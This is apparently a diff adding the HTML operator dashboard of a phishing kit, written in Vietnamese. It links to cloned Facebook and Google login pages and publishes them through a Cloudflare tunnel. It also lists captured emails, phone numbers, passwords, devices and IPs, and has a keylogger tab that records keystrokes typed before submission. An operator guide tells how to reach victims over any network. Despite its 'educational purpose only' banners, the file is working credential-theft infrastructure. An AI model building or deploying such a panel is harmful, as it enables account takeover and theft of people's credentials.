@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔬 Phishing Research Lab - Dashboard</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="dashboard-style.css">
+</head>
+<body>
+    <header class="header">
+        <div class="header-left">
+            <div class="logo">
+                <span class="logo-icon">🔬</span>
+                <div>
+                    <h1>Phishing Research Lab</h1>
+                    <span class="badge">EDUCATIONAL PURPOSE ONLY</span>
+                </div>
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="status-dot"></div>
+            <span class="status-text">Server Active</span>
+        </div>
+    </header>
+
+    <div class="tunnel-banner" id="tunnelBanner">
+        <div class="tunnel-status" id="tunnelStatus">
+            <span class="tunnel-spinner"></span>
+            <span>Đang kết nối Cloudflare Tunnel...</span>
+        </div>
+    </div>
+
+    <div class="stats-grid">
+        <div class="stat-card">
+            <div class="stat-icon si-harvest">🎣</div>
+            <div class="stat-info">
+                <span class="stat-value" id="totalEntries">0</span>
+                <span class="stat-label">Tổng thu hoạch</span>
+            </div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon si-mobile">📱</div>
+            <div class="stat-info">
+                <span class="stat-value" id="mobileCount">0</span>
+                <span class="stat-label">Từ Mobile</span>
+            </div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon si-desktop">💻</div>
+            <div class="stat-info">
+                <span class="stat-value" id="desktopCount">0</span>
+                <span class="stat-label">Từ Desktop</span>
+            </div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-icon si-key">⌨️</div>
+            <div class="stat-info">
+                <span class="stat-value" id="keystrokeCount">0</span>
+                <span class="stat-label">Keystrokes</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="tab-nav">
+        <button class="tab-btn active" onclick="switchTab('links')">🔗 Links</button>
+        <button class="tab-btn" onclick="switchTab('data')">📋 Dữ liệu</button>
+        <button class="tab-btn" onclick="switchTab('keylog')">⌨️ Keylog</button>
+        <button class="tab-btn" onclick="switchTab('guide')">📖 Guide</button>
+    </div>
+
+    <div class="tab-content active" id="tab-links">
+        <div class="section">
+            <h2 class="section-title">🔗 Link Phishing</h2>
+            <p class="section-desc">Khi Tunnel kết nối, link dưới đây hoạt động qua Internet</p>
+            <div class="links-grid">
+                <div class="link-card">
+                    <div class="link-header"><span class="link-icon">📘</span><span>Facebook</span></div>
+                    <div class="link-url" id="fbLink">/phishing/facebook.html</div>
+                    <div class="link-actions">
+                        <button class="btn-copy" onclick="copyLink('fbLink')">📋 Copy</button>
+                        <button class="btn-preview" onclick="window.open(document.getElementById('fbLink').textContent,'_blank')">👁️ Xem</button>
+                    </div>
+                </div>
+                <div class="link-card">
+                    <div class="link-header"><span class="link-icon">📧</span><span>Google</span></div>
+                    <div class="link-url" id="ggLink">/phishing/google.html</div>
+                    <div class="link-actions">
+                        <button class="btn-copy" onclick="copyLink('ggLink')">📋 Copy</button>
+                        <button class="btn-preview" onclick="window.open(document.getElementById('ggLink').textContent,'_blank')">👁️ Xem</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="tab-content" id="tab-data">
+        <div class="section">
+            <div class="section-header">
+                <h2 class="section-title">📋 Dữ liệu thu hoạch</h2>
+                <div class="section-actions">
+                    <button class="btn-refresh" onclick="loadData()">🔄 Mới</button>
+                    <button class="btn-export" onclick="exportData()">📥 Export</button>
+                    <button class="btn-danger" onclick="clearData()">🗑️ Xóa</button>
+                </div>
+            </div>
+            <div class="table-container">
+                <table class="data-table">
+                    <thead><tr><th>#</th><th>Thời gian</th><th>Loại</th><th>Email/SĐT</th><th>Mật khẩu</th><th>Thiết bị</th><th>IP</th></tr></thead>
+                    <tbody id="dataBody"><tr class="empty-row"><td colspan="7">Chưa có dữ liệu...</td></tr></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <div class="tab-content" id="tab-keylog">
+        <div class="section">
+            <div class="section-header">
+                <h2 class="section-title">⌨️ Keylogger</h2>
+                <div class="section-actions"><button class="btn-refresh" onclick="loadKeylog()">🔄 Mới</button></div>
+            </div>
+            <p class="section-desc">Ghi lại từng phím gõ, kể cả khi chưa bấm submit</p>
+            <div id="keylogContainer" class="keylog-container"><div class="empty-state">Chưa có keylog</div></div>
+        </div>
+    </div>
+
+    <div class="tab-content" id="tab-guide">
+        <div class="section">
+            <h2 class="section-title">📖 Hướng dẫn (Không cần cùng WiFi!)</h2>
+            <div class="guide-grid">
+                <div class="guide-card"><div class="guide-step">1</div><h3>Chạy Server</h3><p><code>npm start</code> → tự tạo Tunnel</p></div>
+                <div class="guide-card"><div class="guide-step">2</div><h3>Chờ Tunnel</h3><p>10-20s → link <code>*.trycloudflare.com</code></p></div>
+                <div class="guide-card"><div class="guide-step">3</div><h3>Copy Link</h3><p>Copy link phishing từ tab Links</p></div>
+                <div class="guide-card"><div class="guide-step">4</div><h3>Mở trên ĐT</h3><p>4G/WiFi khác đều OK!</p></div>
+                <div class="guide-card"><div class="guide-step">5</div><h3>Nhập thử</h3><p>Nhập email + pass giả trên ĐT</p></div>
+                <div class="guide-card"><div class="guide-step">6</div><h3>Xem kết quả</h3><p>Dashboard hiện dữ liệu realtime</p></div>
+            </div>
+            <div class="explanation-card">
+                <div class="flow-diagram">
+                    <div class="flow-step"><div class="flow-icon">📱</div><div class="flow-label">ĐT (4G)</div></div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step highlight"><div class="flow-icon">☁️</div><div class="flow-label">Cloudflare</div></div>
+                    <div class="flow-arrow">→</div>
+                    <div class="flow-step"><div class="flow-icon">💻</div><div class="flow-label">Laptop</div></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="warning-banner">⚠️ <strong>CẢNH BÁO:</strong> CHỈ dùng cho nghiên cứu bảo mật. Lừa đảo là vi phạm pháp luật.</div>
+
+    <script src="dashboard-script.js"></script>
+</body>
+</html>
